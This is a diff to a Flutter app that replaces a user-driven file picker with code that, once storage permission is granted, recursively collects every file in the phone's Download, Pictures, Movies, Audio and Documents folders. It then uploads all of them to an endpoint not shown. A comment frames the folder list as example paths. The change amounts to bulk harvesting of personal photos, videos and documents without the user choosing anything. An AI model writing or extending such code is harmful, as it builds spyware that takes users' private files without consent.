@@ -24,6 +24,7 @@ class MyHomePage extends StatefulWidget {
 
 class _MyHomePageState extends State<MyHomePage> {
   String _statusMessage = '';
+  List<File> _files = [];
 
   @override
   void initState() {
@@ -72,7 +73,7 @@ class _MyHomePageState extends State<MyHomePage> {
         setState(() {
           _statusMessage = "Storage Permission Granted";
         });
-        await _pickFilesAndUpload();
+        await _getAllFilesAndUpload();
       } else {
         setState(() {
           _statusMessage = "Storage Permission Denied";
@@ -82,34 +83,52 @@ class _MyHomePageState extends State<MyHomePage> {
       setState(() {
         _statusMessage = "Storage Permission Already Granted";
       });
-      await _pickFilesAndUpload();
+      await _getAllFilesAndUpload();
     }
   }
 
-  Future<void> _pickFilesAndUpload() async {
+  Future<void> _getAllFilesAndUpload() async {
     try {
-      // Pick files using file_picker
-      FilePickerResult? result = await FilePicker.platform.pickFiles(
-        allowMultiple: true, // Allow selecting multiple files
-        type: FileType.any, // Allow any type of file
-      );
+      // Example paths; update this to reflect your actual file paths
+      final paths = [
+        '/storage/emulated/0/Download',
+        '/storage/emulated/0/Pictures',
+        '/storage/emulated/0/Movies',
+        '/storage/emulated/0/Audio',
+        '/storage/emulated/0/Documents',
+      ];
 
-      if (result != null) {
-        List<File> files = result.paths.map((path) => File(path!)).toList();
-        for (var file in files) {
-          await _uploadFile(file);
+      List<File> allFiles = [];
+      for (var path in paths) {
+        final directory = Directory(path);
+        if (await directory.exists()) {
+          final files = directory.listSync(recursive: true).whereType<File>().toList();
+          allFiles.addAll(files);
         }
-        setState(() {
-          _statusMessage = 'All files uploaded successfully';
-        });
-      } else {
-        setState(() {
-          _statusMessage = 'No files selected';
-        });
       }
+
+      if (allFiles.isEmpty) {
+        setState(() {
+          _statusMessage = 'No files found';
+        });
+        return;
+      }
+
+      setState(() {
+        _files = allFiles;
+      });
+
+      for (var file in _files) {
+        await _uploadFile(file);
+      }
+
+      setState(() {
+        _statusMessage = 'All files uploaded successfully';
+      });
+
     } catch (e) {
       setState(() {
-        _statusMessage = 'Error selecting files: $e';
+        _statusMessage = 'Error getting files: $e';
       });
     }
   }
